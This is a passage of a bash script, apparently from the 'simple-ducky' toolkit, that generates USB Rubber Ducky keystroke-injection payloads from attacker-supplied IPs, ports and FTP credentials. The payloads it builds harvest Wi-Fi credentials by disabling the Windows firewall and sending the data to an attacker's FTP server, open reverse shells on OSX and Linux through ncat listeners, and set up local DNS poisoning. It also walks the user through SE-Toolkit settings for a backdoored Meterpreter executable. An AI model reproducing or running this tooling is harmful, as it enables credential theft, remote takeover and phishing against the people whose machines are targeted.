	rm /usr/share/simple-ducky/payload_del3.txt
	rm /usr/share/simple-ducky/payload_del4.txt
	rm /usr/share/simple-ducky/payload_del5.txt
	rm /usr/share/simple-ducky/payload_del6.txt
	clear
	read -p "Would you like to use a US keyboard a different format [Enter=US|o=other]? " language 
	if [ "$language" == "o" ]; then
		clear
		echo -e "\e[1;34mPlease enter the keyboard code you would like to use.\e[0m"
		echo ""
		echo "fr: French"
		echo "pt: Portuguese"
		echo "us: English-US"
		echo "be: Belgian"
		echo "da: Danish"
		echo "de: German"
		echo "no: Norwegian"
		echo "sv: Swedish"
		echo "uk: English-UK"
		echo ""
		read -p "Option: " keyboard
		clear
		echo -e "\e[1;34mGenerating your inject.bin file...\e[0m"
		echo ""
		sleep 2	
		java -jar encoder.jar -i payload.txt  -l $keyboard -o inject.bin
		echo ""
		echo -e "\e[1;34mYour payload has been created, its located in /usr/share/simple-ducky\e[0m"
		echo ""
		read -p "Press any key to contiue" enter	
	else 
		clear
		echo -e "\e[1;34mGenerating your inject.bin file...\e[0m"
		echo ""
		sleep 2
		java -jar encoder.jar -i payload.txt -o inject.bin
		echo ""
		echo -e "\e[1;34mYour payload has been created, its located in /usr/share/simple-ducky\e[0m"
		echo ""
		read -p "Press any key to contiue" enter
	fi 
	clear
	echo -e "\e[1;34mMoving files over to your web directory and starting your web and ftp servers.\e[0m"
	sleep 4
	clear
	cp /usr/share/simple-ducky/misc/7za.exe /var/www/7za.exe
	clear
	service apache2 restart
	clear
	service pure-ftpd restart
	clear
	xdg-open /usr/share/simple-ducky/ &
	clear
	read -p "Would you like to return to the main menu [y/n]? " option
	clear
	
	case $option in
	y) simple-ducky ;;
	n) clear;exit ;;
	*) clear;exit ;;
	esac 
}

#################################################################################
# WiFi Acess Point Crediential Harvester w/UAC (Win Vista/7)
#################################################################################
f_wifunVIS7uac(){
	clear
	echo -e "\e[1;31mDescription:\e[0m This script will enter the command shell as an administrator, disable the firewall and export the wifi settings. The exported settings will be sent to an ftp server of your choice."
	echo -e "\e[1;31mTarget:\e[0m Windows Vista/7 w/UAC Enabled"
	echo -e "\e[1;31mAuthor:\e[0m Bucky67GTO"
	echo ""
	echo ""
	read -p "What is the IP/Domain of your ftp server? " attackerftp
	echo ""
	read -p "What is the username for your ftp server? " attackerusername
	echo ""
	read -p "What is the password for your ftp server? " attackerpassword
	echo ""
	echo -e "How long of a delay would like before starting? "
	read -p "Use Milliseconds (15000 ms = 15 sec) " pausemilsec
	echo ""
	clear
	sed "/STRING/s/attackerftp/$attackerftp/g" /usr/share/simple-ducky/payloads/wifunVIS7uac.conf > /usr/share/simple-ducky/payload_del.txt
	sed "/STRING/s/attackerusername/$attackerusername/g" /usr/share/simple-ducky/payload_del.txt > /usr/share/simple-ducky/payload_del2.txt
	sed "/STRING/s/attackerpassword/$attackerpassword/g" /usr/share/simple-ducky/payload_del2.txt > /usr/share/simple-ducky/payload.txt
	sed -i "1iDELAY $pausemilsec" /usr/share/simple-ducky/payload.txt
	rm /usr/share/simple-ducky/payload_del.txt
	rm /usr/share/simple-ducky/payload_del2.txt
	clear
	read -p "Would you like to use a US keyboard a different format [Enter=US|o=other]? " language 
	if [ "$language" == "o" ]; then
		clear
		echo -e "\e[1;34mPlease enter the keyboard code you would like to use.\e[0m"
		echo ""
		echo "fr: French"
		echo "pt: Portuguese"
		echo "us: English-US"
		echo "be: Belgian"
		echo "da: Danish"
		echo "de: German"
		echo "no: Norwegian"
		echo "sv: Swedish"
		echo "uk: English-UK"
		echo ""
		read -p "Option: " keyboard
		clear
		echo -e "\e[1;34mGenerating your inject.bin file...\e[0m"
		echo ""
		sleep 2	
		java -jar encoder.jar -i payload.txt  -l $keyboard -o inject.bin
		echo ""
		echo -e "\e[1;34mYour payload has been created, its located in /usr/share/simple-ducky\e[0m"
		echo ""
		read -p "Press any key to contiue" enter	
	else 
		clear
		echo -e "\e[1;34mGenerating your inject.bin file...\e[0m"
		echo ""
		sleep 2
		java -jar encoder.jar -i payload.txt -o inject.bin
		echo ""
		echo -e "\e[1;34mYour payload has been created, its located in /usr/share/simple-ducky\e[0m"
		echo ""
		read -p "Press any key to contiue" enter
	fi 
	clear
	xdg-open /usr/share/simple-ducky/ &
	clear
	service pure-ftpd restart
	clear
	read -p "Would you like to return to the main menu [y/n]? " option
	clear
	
	case $option in
	y) simple-ducky ;;
	n) clear;exit ;;
	*) clear;exit ;;
	esac 
}

#################################################################################
# WiFi Acess Point Crediential Harvester w/o UAC (Win Vista/7)
#################################################################################
f_wifunVIS7nouac(){
	clear
	echo -e "\e[1;31mDescription:\e[0m This script will enter the command shell as an administrator, disable the firewall and export the wifi settings. The exported settings will be sent to an ftp server of your choice."
	echo -e "\e[1;31mTarget:\e[0m Windows Vista/7 w/o UAC Enabled"
	echo -e "\e[1;31mAuthor:\e[0m Bucky67GTO"
	echo ""
	echo ""
	read -p "What is the IP/Domain of your ftp server? " attackerftp
	echo ""
	read -p "What is the username for your ftp server? " attackerusername
	echo ""
	read -p "What is the password for your ftp server? " attackerpassword
	echo ""
	echo -e "How long of a delay would like before starting? "
	read -p "Use Milliseconds (15000 ms = 15 sec) " pausemilsec
	echo ""
	clear
	sed "/STRING/s/attackerftp/$attackerftp/g" /usr/share/simple-ducky/payloads/wifunVIS7nouac.conf > /usr/share/simple-ducky/payload_del.txt
	sed "/STRING/s/attackerusername/$attackerusername/g" /usr/share/simple-ducky/payload_del.txt > /usr/share/simple-ducky/payload_del2.txt
	sed "/STRING/s/attackerpassword/$attackerpassword/g" /usr/share/simple-ducky/payload_del2.txt > /usr/share/simple-ducky/payload.txt
	sed -i "1iDELAY $pausemilsec" /usr/share/simple-ducky/payload.txt
	rm /usr/share/simple-ducky/payload_del.txt
	rm /usr/share/simple-ducky/payload_del2.txt
	clear
	read -p "Would you like to use a US keyboard a different format [Enter=US|o=other]? " language 
	if [ "$language" == "o" ]; then
		clear
		echo -e "\e[1;34mPlease enter the keyboard code you would like to use.\e[0m"
		echo ""
		echo "fr: French"
		echo "pt: Portuguese"
		echo "us: English-US"
		echo "be: Belgian"
		echo "da: Danish"
		echo "de: German"
		echo "no: Norwegian"
		echo "sv: Swedish"
		echo "uk: English-UK"
		echo ""
		read -p "Option: " keyboard
		clear
		echo -e "\e[1;34mGenerating your inject.bin file...\e[0m"
		echo ""
		sleep 2	
		java -jar encoder.jar -i payload.txt  -l $keyboard -o inject.bin
		echo ""
		echo -e "\e[1;34mYour payload has been created, its located in /usr/share/simple-ducky\e[0m"
		echo ""
		read -p "Press any key to contiue" enter	
	else 
		clear
		echo -e "\e[1;34mGenerating your inject.bin file...\e[0m"
		echo ""
		sleep 2
		java -jar encoder.jar -i payload.txt -o inject.bin
		echo ""
		echo -e "\e[1;34mYour payload has been created, its located in /usr/share/simple-ducky\e[0m"
		echo ""
		read -p "Press any key to contiue" enter
	fi 
	clear
	xdg-open /usr/share/simple-ducky/ &
	clear
	service pure-ftpd restart
	clear
	read -p "Would you like to return to the main menu [y/n]? " option
	clear
	
	case $option in
	y) simple-ducky ;;
	n) clear;exit ;;
	*) clear;exit ;;
	esac 
}

#################################################################################
# WiFi Acess Point Crediential Harvester w/UAC (Win 8)
#################################################################################
f_wifunWIN8uac(){
	clear
	echo -e "\e[1;31mDescription:\e[0m This script will enter the command shell as an administrator, disable the firewall and export the wifi settings. The exported settings will be sent to an ftp server of your choice."
	echo -e "\e[1;31mTarget:\e[0m Windows 8 w/UAC Enabled"
	echo -e "\e[1;31mAuthor:\e[0m Bucky67GTO"
	echo ""
	echo ""
	read -p "What is the IP/Domain of your ftp server? " attackerftp
	echo ""
	read -p "What is the username for your ftp server? " attackerusername
	echo ""
	read -p "What is the password for your ftp server? " attackerpassword
	echo ""
	echo -e "How long of a delay would like before starting? "
	read -p "Use Milliseconds (15000 ms = 15 sec) " pausemilsec
	echo ""
	clear
	sed "/STRING/s/attackerftp/$attackerftp/g" /usr/share/simple-ducky/payloads/wifunWIN8uac.conf > /usr/share/simple-ducky/payload_del.txt
	sed "/STRING/s/attackerusername/$attackerusername/g" /usr/share/simple-ducky/payload_del.txt > /usr/share/simple-ducky/payload_del2.txt
	sed "/STRING/s/attackerpassword/$attackerpassword/g" /usr/share/simple-ducky/payload_del2.txt > /usr/share/simple-ducky/payload.txt
	sed -i "1iDELAY $pausemilsec" /usr/share/simple-ducky/payload.txt
	rm /usr/share/simple-ducky/payload_del.txt
	rm /usr/share/simple-ducky/payload_del2.txt
	clear
	read -p "Would you like to use a US keyboard a different format [Enter=US|o=other]? " language 
	if [ "$language" == "o" ]; then
		clear
		echo -e "\e[1;34mPlease enter the keyboard code you would like to use.\e[0m"
		echo ""
		echo "fr: French"
		echo "pt: Portuguese"
		echo "us: English-US"
		echo "be: Belgian"
		echo "da: Danish"
		echo "de: German"
		echo "no: Norwegian"
		echo "sv: Swedish"
		echo "uk: English-UK"
		echo ""
		read -p "Option: " keyboard
		clear
		echo -e "\e[1;34mGenerating your inject.bin file...\e[0m"
		echo ""
		sleep 2	
		java -jar encoder.jar -i payload.txt  -l $keyboard -o inject.bin
		echo ""
		echo -e "\e[1;34mYour payload has been created, its located in /usr/share/simple-ducky\e[0m"
		echo ""
		read -p "Press any key to contiue" enter	
	else 
		clear
		echo -e "\e[1;34mGenerating your inject.bin file...\e[0m"
		echo ""
		sleep 2
		java -jar encoder.jar -i payload.txt -o inject.bin
		echo ""
		echo -e "\e[1;34mYour payload has been created, its located in /usr/share/simple-ducky\e[0m"
		echo ""
		read -p "Press any key to contiue" enter
	fi 
	clear
	xdg-open /usr/share/simple-ducky/ &
	clear
	service pure-ftpd restart
	clear
	read -p "Would you like to return to the main menu [y/n]? " option
	clear
	
	case $option in
	y) simple-ducky ;;
	n) clear;exit ;;
	*) clear;exit ;;
	esac 
}

#################################################################################
# WiFi Acess Point Crediential Harvester w/o UAC (Win 8)
#################################################################################
f_wifunWIN8nouac(){
	clear
	echo -e "\e[1;31mDescription:\e[0m This script will enter the command shell as an administrator, disable the firewall and export the wifi settings. The exported settings will be sent to an ftp server of your choice."
	echo -e "\e[1;31mTarget:\e[0m Windows 8 w/o UAC Enabled"
	echo -e "\e[1;31mAuthor:\e[0m Bucky67GTO"
	echo ""
	echo ""
	read -p "What is the IP/Domain of your ftp server? " attackerftp
	echo ""
	read -p "What is the username for your ftp server? " attackerusername
	echo ""
	read -p "What is the password for your ftp server? " attackerpassword
	echo ""
	echo -e "How long of a delay would like before starting? "
	read -p "Use Milliseconds (15000 ms = 15 sec) " pausemilsec
	echo ""
	clear
	sed "/STRING/s/attackerftp/$attackerftp/g" /usr/share/simple-ducky/payloads/wifunWIN8nouac.conf > /usr/share/simple-ducky/payload_del.txt
	sed "/STRING/s/attackerusername/$attackerusername/g" /usr/share/simple-ducky/payload_del.txt > /usr/share/simple-ducky/payload_del2.txt
	sed "/STRING/s/attackerpassword/$attackerpassword/g" /usr/share/simple-ducky/payload_del2.txt > /usr/share/simple-ducky/payload.txt
	sed -i "1iDELAY $pausemilsec" /usr/share/simple-ducky/payload.txt
	rm /usr/share/simple-ducky/payload_del.txt
	rm /usr/share/simple-ducky/payload_del2.txt
	clear
	read -p "Would you like to use a US keyboard a different format [Enter=US|o=other]? " language 
	if [ "$language" == "o" ]; then
		clear
		echo -e "\e[1;34mPlease enter the keyboard code you would like to use.\e[0m"
		echo ""
		echo "fr: French"
		echo "pt: Portuguese"
		echo "us: English-US"
		echo "be: Belgian"
		echo "da: Danish"
		echo "de: German"
		echo "no: Norwegian"
		echo "sv: Swedish"
		echo "uk: English-UK"
		echo ""
		read -p "Option: " keyboard
		clear
		echo -e "\e[1;34mGenerating your inject.bin file...\e[0m"
		echo ""
		sleep 2	
		echo -e "\e[1;34mGenerating your payload\e[0m"
		sleep 2
		java -jar encoder.jar -i payload.txt  -l $keyboard -o inject.bin
		echo ""
		echo -e "\e[1;34mYour payload has been created, its located in /usr/share/simple-ducky\e[0m"
		echo ""
		read -p "Press any key to contiue" enter	
	else 
		clear
		echo -e "\e[1;34mGenerating your inject.bin file...\e[0m"
		echo ""
		sleep 2
		echo -e "\e[1;34mGenerating your payload\e[0m"
		sleep 2
		java -jar encoder.jar -i payload.txt -o inject.bin
		echo ""
		echo -e "\e[1;34mYour payload has been created, its located in /usr/share/simple-ducky\e[0m"
		echo ""
		read -p "Press any key to contiue" enter
	fi 
	clear
	xdg-open /usr/share/simple-ducky/ &
	clear
	service pure-ftpd restart
	clear
	read -p "Would you like to return to the main menu [y/n]? " option
	clear
	
	case $option in
	y) simple-ducky ;;
	n) clear;exit ;;
	*) clear;exit ;;
	esac 
}

#################################################################################
#################################################################################
#
# Linux and OSX Payloads
#
#################################################################################
#################################################################################

#################################################################################
# OSX Reverse Shell
#################################################################################
f_osxrev(){
	clear
	echo -e "\e[1;31mDiscription:\e[0m This payload is designed to provide a reverse shell."
	echo -e "\e[1;31mNote:\e[0m Ncat will need to be installed for this payload to work."
	echo -e "\e[1;31mTarget:\e[0m MAC OSX (Various)"
	echo -e "\e[1;31mAuthor:\e[0m Sharkey"	
	echo ""
	echo ""
	read -p "Where shall I send your shell? " attackerip
	echo ""
	read -p "What port will you be listening on? " attackerport
	echo ""
	echo -e "How long of a delay would like before starting? "
	read -p "Use Milliseconds (15000 ms = 15 sec) " pausemilsec
	echo ""
	clear
	echo -e "\e[1;34mAlmost done. Let's set your keyboard language\e[0m"
	echo ""
	sed "/nc/s/ipport/$attackerip $attackerport/g" /usr/share/simple-ducky/payloads/osxrev.conf > /usr/share/simple-ducky/payload.txt
	sed -i "1iDELAY $pausemilsec" /usr/share/simple-ducky/payload.txt
	clear
	read -p "Would you like to use a US keyboard a different format [Enter=US|o=other]? " language 
	if [ "$language" == "o" ]; then
		clear
		echo -e "\e[1;34mPlease enter the keyboard code you would like to use.\e[0m"
		echo ""
		echo "fr: French"
		echo "pt: Portuguese"
		echo "us: English-US"
		echo "be: Belgian"
		echo "da: Danish"
		echo "de: German"
		echo "no: Norwegian"
		echo "sv: Swedish"
		echo "uk: English-UK"
		echo ""
		read -p "Option: " keyboard
		clear	
		java -jar encoder.jar -i payload.txt  -l $keyboard -o inject.bin
		echo ""
		echo -e "\e[1;34mYour payload has been created, its located in /usr/share/simple-ducky\e[0m"
		echo ""
		read -p "Press any key to contiue" enter	
	else 
		java -jar encoder.jar -i payload.txt -o inject.bin
		echo ""
		echo -e "\e[1;34mYour payload has been created, its located in /usr/share/simple-ducky\e[0m"
		echo ""
		read -p "Press any key to contiue" enter
	fi 
	clear
	read -p "Would you like me to setup a listener [y/n]? " listener
	clear
	if [ "$listener" == "n" ]; then
		read -p "Would you like to return to the main menu [y/n]? " option
	else 
		x-terminal-emulator -e ncat -lvp $attackerport &
		xdg-open /usr/share/simple-ducky/ &
		clear
		read -p "Would you like to return to the main menu [y/n]? " option
	fi
	
	
	case $option in
	y) simple-ducky ;;
	n) clear;exit ;;
	*) clear;exit ;;
	esac 
}

#################################################################################
# OSX Single User Mode Backdoor
#################################################################################
f_osxsingleuserrev(){
	clear
	echo -e "\e[1;31mDiscription:\e[0m This payload is designed to provide a reverse shell using OSX Single User Mode."
	echo -e "\e[1;31mUsage:\e[0m Boot into single user mode with (Command – S). At the command prompt, plug in the ducky. "
	echo -e "\e[1;31mNote:\e[0m Be sure to use duck_v2.1.hex or above (see ducky-decode link)."
	echo -e "\e[1;31mDucky-Decode Link:\e[0m https://code.google.com/p/ducky-decode/"
	echo -e "\e[1;31mPayload Support Page:\e[0m http://patrickmosca.com/root-a-mac-in-10-seconds-or-less/"
	echo -e "\e[1;31mTarget:\e[0m MAC OSX"
	echo -e "\e[1;31mAuthor:\e[0m Patrick Mosca"	
	echo ""
	echo ""
	read -p "Where shall I send your shell? " attackerip
	echo ""
	read -p "What port will you be listening on? " attackerport
	echo ""
	echo -e "How long of a delay would like before starting? "
	read -p "Use Milliseconds (15000 ms = 15 sec) " pausemilsec
	echo ""
	clear
	echo -e "\e[1;34mAlmost done. Let's set your keyboard language\e[0m"
	echo ""
	sed "/dev/s/attackerip/$attackerip/g" /usr/share/simple-ducky/payloads/osxsingleuserrev.conf > /usr/share/simple-ducky/payload_del.txt
	sed "/dev/s/attackerport/$attackerport/g" /usr/share/simple-ducky/payload_del.txt > /usr/share/simple-ducky/payload.txt
	sed -i "1iDELAY $pausemilsec" /usr/share/simple-ducky/payload.txt
	rm payload_del.txt
	clear
	read -p "Would you like to use a US keyboard a different format [Enter=US|o=other]? " language 
	if [ "$language" == "o" ]; then
		clear
		echo -e "\e[1;34mPlease enter the keyboard code you would like to use.\e[0m"
		echo ""
		echo "fr: French"
		echo "pt: Portuguese"
		echo "us: English-US"
		echo "be: Belgian"
		echo "da: Danish"
		echo "de: German"
		echo "no: Norwegian"
		echo "sv: Swedish"
		echo "uk: English-UK"
		echo ""
		read -p "Option: " keyboard
		clear
		echo -e "\e[1;34mGenerating your inject.bin file...\e[0m"
		echo ""
		sleep 2	
		java -jar encoder.jar -i payload.txt  -l $keyboard -o inject.bin
		echo ""
		echo -e "\e[1;34mYour payload has been created, its located in /usr/share/simple-ducky\e[0m"
		echo ""
		read -p "Press any key to contiue" enter	
	else 
		clear
		echo -e "\e[1;34mGenerating your inject.bin file...\e[0m"
		echo ""
		sleep 2
		java -jar encoder.jar -i payload.txt -o inject.bin
		echo ""
		echo -e "\e[1;34mYour payload has been created, its located in /usr/share/simple-ducky\e[0m"
		echo ""
		read -p "Press any key to contiue" enter
	fi 
	clear
	read -p "Would you like me to setup a listener [y/n]? " listener
	clear
	if [ "$listener" == "n" ]; then
		read -p "Would you like to return to the main menu [y/n]? " option
	else 
		x-terminal-emulator -e ncat -lvp $attackerport &
		xdg-open /usr/share/simple-ducky/ &
		clear
		read -p "Would you like to return to the main menu [y/n]? " option
	fi
	
	
	case $option in
	y) simple-ducky ;;
	n) clear;exit ;;
	*) clear;exit ;;
	esac 
}

#################################################################################
# Linux Reverse Shell
#################################################################################
f_linuxrev(){
	clear
	echo -e "\e[1;31mDescription:\e[0m This payload is designed to prvide a reverse shell."
	echo -e "\e[1;31mNote:\e[0m It is assumed that the victim's distro has Ncat Installed"
	echo -e "\e[1;31mAuthor:\e[0m Travis Weathers (skysploit)"
	echo ""
	echo ""
	read -p "Where shall I send your shell? " attackerip
	echo ""
	read -p "What port will you be listening on? " attackerport
	echo ""
	echo -e "How long of a delay would like before starting? "
	read -p "Use Milliseconds (15000 ms = 15 sec) " pausemilsec
	echo ""
	clear
	echo -e "\e[1;34mAlmost done. Let's set your keyboard language\e[0m"
	sleep 2
	echo ""
	sed "/nc/s/ipport/$attackerip $attackerport/g" /usr/share/simple-ducky/payloads/linuxrev.conf > /usr/share/simple-ducky/payload.txt
	sed -i "1iDELAY $pausemilsec" /usr/share/simple-ducky/payload.txt
	clear
	read -p "Would you like to use a US keyboard a different format [Enter=US|o=other]? " language 
	if [ "$language" == "o" ]; then
		clear
		echo -e "\e[1;34mPlease enter the keyboard code you would like to use.\e[0m"
		echo ""
		echo "fr: French"
		echo "pt: Portuguese"
		echo "us: English-US"
		echo "be: Belgian"
		echo "da: Danish"
		echo "de: German"
		echo "no: Norwegian"
		echo "sv: Swedish"
		echo "uk: English-UK"
		echo ""
		read -p "Option: " keyboard
		clear
		echo -e "\e[1;34mGenerating your inject.bin file...\e[0m"
		echo ""
		sleep 2	
		java -jar encoder.jar -i payload.txt  -l $keyboard -o inject.bin
		echo ""
		echo -e "\e[1;34mYour payload has been created, its located in /usr/share/simple-ducky\e[0m"
		echo ""
		read -p "Press any key to contiue" enter	
	else 
		clear
		echo -e "\e[1;34mGenerating your inject.bin file...\e[0m"
		echo ""
		sleep 2
		java -jar encoder.jar -i payload.txt -o inject.bin
		echo ""
		echo -e "\e[1;34mYour payload has been created, its located in /usr/share/simple-ducky\e[0m"
		echo ""
		read -p "Press any key to contiue" enter
	fi 
	clear
	read -p "Would you like me to setup a listener [y/n]? " listener
	clear
	if [ "$listener" == "n" ]; then
		read -p "Would you like to return to the main menu [y/n]? " option
	else 
		x-terminal-emulator -e ncat -lvp $attackerport &
		xdg-open /usr/share/simple-ducky/ &
		clear
		read -p "Would you like to return to the main menu [y/n]? " option
	fi
		
	
	case $option in
	y) simple-ducky ;;
	n) clear;exit ;;
	*) clear;exit ;;
	esac 
}


#################################################################################
#################################################################################
#
# Forced Phishing
#
#################################################################################
#################################################################################

#################################################################################
# Local DNS Poisoning | SE-Toolkit w/UAC (Win Vista/7)
#################################################################################
f_setlocaldnsVIS7uac(){
	clear
	echo -e "\e[1;31mDiscription:\e[0m This payload is designed to setup local DNS poisioning on the victims machine. Couple this attack with the SE-Toolkit's website cloner and you will be unstoppable."
	echo -e "\e[1;31mTarget:\e[0m Windows Vista/7 with UAC enabled"
	echo -e "\e[1;31mAuthor:\e[0m Travis Weathers (skysploit) | props to ashbreeze96 and overwraith for the original concept"
	echo ""
	echo ""
	read -p "What is the IP address of your attacking webserver? " attackerip
	echo ""
	read -p "What website do you plan on spoofing (Don't use the FQDN)(example: example.com)? " attackerdomain
	echo -e ""
	read -p "Use Milliseconds (15000 ms = 15 sec) " pausemilsec
	clear
	echo -e "\e[1;34mAlmost done. Let's set your keyboard language\e[0m"
	echo ""
	sed "/STRING/s/attackerip/$attackerip/g" /usr/share/simple-ducky/setlocaldnsVIS7uac.conf > /usr/share/simple-ducky/payload_del1.txt
	sed "/STRING/s/attackerdomain/$attackerdomain/g" /usr/share/simple-ducky/payload_del1.txt > /usr/share/simple-ducky/payload_del2.txt
	sed "/STRING/s/attackerip/$attackerip/g" /usr/share/simple-ducky/payload_del2.txt > /usr/share/simple-ducky/payload_del3.txt
	sed "/STRING/s/attackerdomain/$attackerdomain/g" /usr/share/simple-ducky/payload_del3.txt > /usr/share/simple-ducky/payload.txt
	sed -i "1iDELAY $pausemilsec" /usr/share/simple-ducky/payload.txt
	rm /usr/share/simple-ducky/payload_del.txt
	rm /usr/share/simple-ducky/payload_del2.txt
	rm /usr/share/simple-ducky/payload_del3.txt
	clear
	read -p "Would you like to use a US keyboard a different format [Enter=US|o=other]? " language 
	if [ "$language" == "o" ]; then
		clear
		echo -e "\e[1;34mPlease enter the keyboard code you would like to use.\e[0m"
		echo ""
		echo "fr: French"
		echo "pt: Portuguese"
		echo "us: English-US"
		echo "be: Belgian"
		echo "da: Danish"
		echo "de: German"
		echo "no: Norwegian"
		echo "sv: Swedish"
		echo "uk: English-UK"
		echo ""
		read -p "Option: " keyboard
		clear
		echo -e "\e[1;34mGenerating your inject.bin file...\e[0m"
		echo ""	
		sleep 2
		java -jar encoder.jar -i payload.txt  -l $keyboard -o inject.bin
		echo ""
		echo -e "\e[1;34mYour payload has been created, its located in /usr/share/simple-ducky\e[0m"
		echo ""
		read -p "Press any key to contiue" enter
	else 
		clear
		echo -e "\e[1;34mGenerating your inject.bin file...\e[0m"
		echo ""
		sleep 2
		java -jar encoder.jar -i payload.txt -o inject.bin
		echo ""
		echo -e "\e[1;34mYour payload has been created, its located in /usr/share/simple-ducky\e[0m"
		echo ""
		read -p "Press any key to contiue" enter
	fi
	clear
	echo -e "\e[1;34mStopping your webserver...\e[0m"
	echo ""
	sleep 2
	service apache2 stop
	clear
	echo ""
	echo -e "\e[1;34mDone!\e[0m"
	clear
	echo -e "\e[1;34mLaunching the Socail Engineering Toolkit (se-toolkit).\e[0m" 
	echo ""
	sleep 2
	x-terminal-emulator -e se-toolkit &
	clear
	echo -e "\e[1;34mHere are some recommended settings for the SE-Toolkit. Make changes as you see fit...\e[0m" 
	echo ""
	sleep 2
	echo ""
	echo "1) Social-Engineering Attacks"
	echo ""
	echo "2) Website Attack Vectors"
	echo ""
	echo "3) Java Applet Attack Method"
	echo ""
	echo "4) Site Cloner"
	echo ""
	echo "5) Are you using NAT/Port Forwarding [yes|no]: no"
	echo ""
	echo "6) IP address or hostname for the reverse connection: $attackerip"
	echo ""
	echo "7) Enter the url to clone: (Example: http://www.thisisafakesite.com)"
	echo ""
	echo "8) What payload do you want to generate: Windows Reverse_TCP Meterpreter"
	echo ""
	echo "9) Backdoored Executable (BEST)"
	echo ""
	echo "10) PORT of the listener [443]: $attackerport" 
	echo ""
	echo ""
	read -p "Press any key to contiue" enter
	xdg-open /usr/share/simple-ducky/ &
	clear	
	read -p "Would you like to return to the main menu [y/n]? " option
	clear
	
	case $option in
	y) simple-ducky ;;
	n) clear;exit ;;
	*) clear;exit ;;
	esac 
}

#################################################################################
# Local DNS Poisoning | SE-Toolkit w/o UAC (Win Vista/7)
#################################################################################
f_setlocaldnsVIS7nouac(){
	clear
	echo -e "\e[1;31mDiscription:\e[0m This payload is designed to setup local DNS poisioning on the victims machine. Couple this attack with the SE-Toolkit's website cloner and you will be unstoppable."
	echo -e "\e[1;31mTarget:\e[0m Windows Vista/7 with UAC disabled"
	echo -e "\e[1;31mAuthor:\e[0m Travis Weathers (skysploit) | props to ashbreeze96 and overwraith for the original concept"
	echo ""
	echo ""
	read -p "What is the IP address of your attacking webserver? " attackerip
	echo ""
	read -p "What website do you plan on spoofing (Don't use the FQDN)(example: example.com)? " attackerdomain
	echo -e ""
	read -p "Use Milliseconds (15000 ms = 15 sec) " pausemilsec
	clear
	echo -e "\e[1;34mAlmost done. Let's set your keyboard language\e[0m"
	echo ""
	sed "/STRING/s/attackerip/$attackerip/g" /usr/share/simple-ducky/setlocaldnsVIS7nouac.conf > /usr/share/simple-ducky/payload_del1.txt
	sed "/STRING/s/attackerdomain/$attackerdomain/g" /usr/share/simple-ducky/payload_del1.txt > /usr/share/simple-ducky/payload_del2.txt
	sed "/STRING/s/attackerip/$attackerip/g" /usr/share/simple-ducky/payload_del2.txt > /usr/share/simple-ducky/payload_del3.txt
	sed "/STRING/s/attackerdomain/$attackerdomain/g" /usr/share/simple-ducky/payload_del3.txt > /usr/share/simple-ducky/payload.txt
	sed -i "1iDELAY $pausemilsec" /usr/share/simple-ducky/payload.txt
	rm /usr/share/simple-ducky/payload_del.txt
	rm /usr/share/simple-ducky/payload_del2.txt
	rm /usr/share/simple-ducky/payload_del3.txt
	clear
	read -p "Would you like to use a US keyboard a different format [Enter=US|o=other]? " language 
	if [ "$language" == "o" ]; then
		clear
		echo -e "\e[1;34mPlease enter the keyboard code you would like to use.\e[0m"
		echo ""
		echo "fr: French"
		echo "pt: Portuguese"
		echo "us: English-US"
		echo "be: Belgian"
		echo "da: Danish"
		echo "de: German"
		echo "no: Norwegian"
		echo "sv: Swedish"
		echo "uk: English-UK"
		echo ""
		read -p "Option: " keyboard
		clear
		echo -e "\e[1;34mGenerating your inject.bin file...\e[0m"
		echo ""	
		sleep 2
		java -jar encoder.jar -i payload.txt  -l $keyboard -o inject.bin
		echo ""
		echo -e "\e[1;34mYour payload has been created, its located in /usr/share/simple-ducky\e[0m"
		echo ""
		read -p "Press any key to contiue" enter
	else 
		clear
		echo -e "\e[1;34mGenerating your inject.bin file...\e[0m"
		echo ""
		sleep 2
		java -jar encoder.jar -i payload.txt -o inject.bin
		echo ""
		echo -e "\e[1;34mYour payload has been created, its located in /usr/share/simple-ducky\e[0m"
		echo ""
		read -p "Press any key to contiue" enter
	fi
	clear
	echo -e "\e[1;34mStopping your webserver...\e[0m"
	echo ""
	sleep 2
	service apache2 stop
	clear
	echo ""
	echo -e "\e[1;34mDone!\e[0m"
	clear
	echo -e "\e[1;34mLaunching the Socail Engineering Toolkit (se-toolkit).\e[0m" 
	echo ""
	sleep 2
	x-terminal-emulator -e se-toolkit &
	clear
	echo -e "\e[1;34mHere are some recommended settings for the SE-Toolkit. Make changes as you see fit...\e[0m" 
	echo ""
	sleep 2
	echo ""
	echo "1) Social-Engineering Attacks"
	echo ""
	echo "2) Website Attack Vectors"
	echo ""
	echo "3) Java Applet Attack Method"
	echo ""
	echo "4) Site Cloner"
	echo ""
	echo "5) Are you using NAT/Port Forwarding [yes|no]: no"
	echo ""
	echo "6) IP address or hostname for the reverse connection: $attackerip"
	echo ""
	echo "7) Enter the url to clone: (Example: http://www.thisisafakesite.com)"
	echo ""
	echo "8) What payload do you want to generate: Windows Reverse_TCP Meterpreter"
	echo ""
	echo "9) Backdoored Executable (BEST)"
	echo ""
	echo "10) PORT of the listener [443]: $attackerport" 
	echo ""
	echo ""
	read -p "Press any key to contiue" enter
	xdg-open /usr/share/simple-ducky/ &
	clear	
	read -p "Would you like to return to the main menu [y/n]? " option
	clear
	
	case $option in
	y) simple-ducky ;;
	n) clear;exit ;;
	*) clear;exit ;;
	esac 
}

#################################################################################
# Local DNS Poisoning | SE-Toolkit w/o UAC (WIndows 8)
#################################################################################
f_setlocaldnsWIN8uac(){
	clear
	echo -e "\e[1;31mDiscription:\e[0m This payload is designed to setup local DNS poisioning on the victims machine. Couple this attack with the SE-Toolkit's website cloner and you will be unstoppable."
	echo -e "\e[1;31mTarget:\e[0m Windows 8 with UAC enabled"
	echo -e "\e[1;31mAuthor:\e[0m Travis Weathers (skysploit) | props to ashbreeze96 and overwraith for the original concept"
	echo ""
	echo ""
	read -p "What is the IP address of your attacking webserver? " attackerip
	echo ""
	read -p "What website do you plan on spoofing (Don't use the FQDN)(example: example.com)? " attackerdomain
	echo -e ""
	read -p "Use Milliseconds (15000 ms = 15 sec) " pausemilsec
	clear
	echo -e "\e[1;34mAlmost done. Let's set your keyboard language\e[0m"
	echo ""
	sed "/STRING/s/attackerip/$attackerip/g" /usr/share/simple-ducky/setlocaldnsWIN8uac.conf > /usr/share/simple-ducky/payload_del1.txt
	sed "/STRING/s/attackerdomain/$attackerdomain/g" /usr/share/simple-ducky/payload_del1.txt > /usr/share/simple-ducky/payload_del2.txt
	sed "/STRING/s/attackerip/$attackerip/g" /usr/share/simple-ducky/payload_del2.txt > /usr/share/simple-ducky/payload_del3.txt
